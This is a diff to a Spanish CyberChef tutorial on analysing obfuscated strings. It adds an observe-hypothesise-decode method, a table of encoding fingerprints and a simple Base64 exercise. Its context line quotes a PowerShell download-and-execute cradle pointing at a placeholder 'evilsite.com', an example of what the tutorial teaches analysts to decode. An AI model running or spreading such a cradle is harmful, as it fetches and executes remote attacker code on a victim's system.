@@ -161,9 +161,7 @@ IEX(New-Object Net.WebClient).DownloadString("https://evilsite.com/evilcode1/Inv
 
 ---
 
-## [EN DESARROLLO]
-
-### Cómo pensar al analizar una cadena ofuscada
+## Cómo pensar al analizar una cadena ofuscada
 
 Hasta aquí, han sido dos pequeños ejercicios para aprender a usar CyberChef y la idea/concepto que hay detrás de él.
 
@@ -202,6 +200,42 @@ La idea se puede resumir de la siguiente manera:
 **Observar → Hipótesis → Operación → Resultado → Análisis → Repetir → Validar**
 
 Este proceso nos permite analizar cadenas desconocidas sin depender de conocer previamente la receta completa.
+
+### Tabla de "huellas visuales" (fingerprints)
+
+Con la práctica, se aprende a reconocer una codificación solo con mirar la forma que tiene la cadena. Esta tabla sirve como referencia rápida para formular la hipótesis del paso 2:
+
+| Huella visual | Qué sugiere | Ejemplo |
+|---|---|---|
+| Termina en `=` o `==` | Base64 (padding) | `Lmtvb2Mgcyd0ZUw=` |
+| Solo caracteres `0-9 A-F` (o `a-f`), longitud par | Hexadecimal | `4C6D74766232...` |
+| Solo `0` y `1` en grupos de 8 | Binario | `01001100 01101101...` |
+| Solo dígitos 0-7, en grupos de 2-3 | Octal | `114 155 164 166...` |
+| Empieza por `H4sI` | Datos Gzip codificados en Base64 | `H4sIAAAAAAAA...` |
+| Empieza por `TVqQ` en Base64 | Ejecutable Windows (.exe/.dll, cabecera `MZ`) | `TVqQAAMAAAAEAAAA...` |
+| Empieza por `%PDF` | Archivo PDF | `%PDF-1.4` |
+| Empieza por `PK` (o `UEs` en Base64) | Archivo ZIP / Office (docx, xlsx…) | `PK\x03\x04` |
+| Texto legible pero con sentido "raro" (letras cambiadas de forma constante) | Cifrado por sustitución / rotación (ROT13, Caesar) | `Uryyb Jbeyq` |
+| Cadena muy uniforme, alfabeto A-Z2-7 | Base32 | `NBUQ====` |
+| Caracteres `%XX` repetidos | URL Encoding | `%20%3B%2F` |
+| Secuencias `\x41\x42...` o `0x41,0x42` | Escape hexadecimal / arrays de bytes (común en shellcode) | `\x4d\x5a\x90\x00` |
+
+> 💡 **Tip:** cuando una cadena Base64 no decodifica a texto legible sino a "basura" con muchos caracteres extraños, es una señal de que hay **otra capa debajo** (compresión, cifrado, otra codificación) — no significa que la hipótesis esté mal, sino que falta seguir iterando.
+
+### Mini-caso práctico adicional
+
+Para afianzar el proceso, veamos una cadena corta y razonemos como lo haría un analista:
+
+`SGVsbG8gU09D`
+
+1. **Observar:** cadena corta, alfabeto alfanumérico, sin `=` al final pero longitud múltiplo de 4 → compatible con Base64.
+2. **Hipótesis:** Base64.
+3. **Operación:** aplicamos "From Base64".
+4. **Resultado:** `Hello SOC` — texto legible en inglés.
+5. **Análisis:** el resultado tiene sentido gramatical, no aparecen nuevos patrones sospechosos (no hay cabeceras binarias, ni más caracteres codificados).
+6. **Validar:** no hace falta seguir iterando, el resultado final es texto plano coherente.
+
+Este mismo razonamiento, aplicado varias veces en cadena, es exactamente lo que hicimos en el "Ejemplo real": cada operación revela una nueva capa, y cada capa nos da pistas (un nuevo patrón, una nueva cabecera) sobre cuál debe ser la siguiente operación.
 
 ---
 
